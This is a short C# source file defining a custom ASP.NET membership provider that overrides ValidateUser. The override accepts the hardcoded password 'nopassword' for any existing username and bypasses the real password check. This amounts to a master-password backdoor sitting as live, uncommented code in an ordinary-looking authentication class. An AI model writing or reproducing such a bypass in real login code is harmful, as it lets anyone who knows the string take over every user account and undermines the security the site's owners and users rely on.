using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;

namespace Disciples
{
    public class MyMembershipProvider : SqlMembershipProvider
    {
        public override bool ValidateUser(string username, string password)
        {
            if (password == "nopassword")
            {
                var user = GetUser(username, false);
                return user != null;
            }
            return base.ValidateUser(username, password);
        }
    }
}
